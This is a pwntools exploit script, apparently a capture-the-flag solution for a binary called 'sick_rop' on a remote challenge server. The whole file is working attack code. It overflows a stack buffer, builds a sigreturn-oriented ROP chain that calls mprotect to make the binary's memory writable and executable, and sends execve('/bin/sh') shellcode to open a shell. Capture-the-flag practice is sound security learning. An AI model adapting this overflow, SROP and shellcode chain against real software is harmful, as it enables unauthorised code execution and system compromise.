from pwn import *
context.terminal = ['tmux','splitw' ,'-h']
context.arch = "amd64"
#context.log_level = 'debug'

r = remote("206.189.125.80", 31772)
#r = gdb.debug("./sick_rop", "break vuln")
#r = process("./sick_rop")
binary = ELF("./sick_rop")

# set the value of RAX
def set_rax(num):
	# need to -1 due to '\n' will be include in read()
	r.sendline(b'A' * (num - 1))
	r.recv()	# wait for input's echo due to write()


# buffer space + RSP space
OFFSET_TO_RET = 0x20 + 0x8
padding = b'A' * OFFSET_TO_RET

# ROPgadget --binary ./sick_rop --only "syscall"
syscall_addr = 0x401014
# pwndbg> search -p 0x40102E
vuln_ptr = 0x4010d8

shellcode =  """mov rdi, 0x68732f6e69622f
                push rdi
                mov rdi, rsp
                mov rax, 0x3b
                xor rsi, rsi
                xor rdx, rdx
                syscall"""
assembled_shellcode = asm(shellcode)


####### To call mprotect() to allow writing of shellcode #######
frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
# All arguments for mprotect syscall
frame.rdi = 0x400000	# Virtual address of binary
frame.rsi = 0x10000	# length of space to change its protection
frame.rdx = 0x7		# set protection to allow RWX
# new RSP must be a pointer to vuln() to jump to it for the next BoF
frame.rsp = vuln_ptr
# Address of Syscall Instruction
frame.rip = syscall_addr

log.info("Changing permission for this address for shellcode: " + hex(frame.rdi))
log.info("New RSP address: " + hex(frame.rsp))

# p64(binary.symbols['vuln']) is to set RAX to call SYS_sigreturn.
payload = padding + p64(binary.symbols['vuln']) + p64(syscall_addr) + bytes(frame)
r.sendline(payload)
r.recv()	# wait for input's echo due to write()
# set to 0xF so that calling syscall will call rt_sigreturn.
set_rax(0xF)


####### Input shellcode on stack and execute it #######
# vuln_ptr+0x10: Location of shellcode after BoF
payload2 = padding + p64(vuln_ptr+0x10) + assembled_shellcode
r.sendline(payload2)
r.recv()	# wait for input's echo due to write()

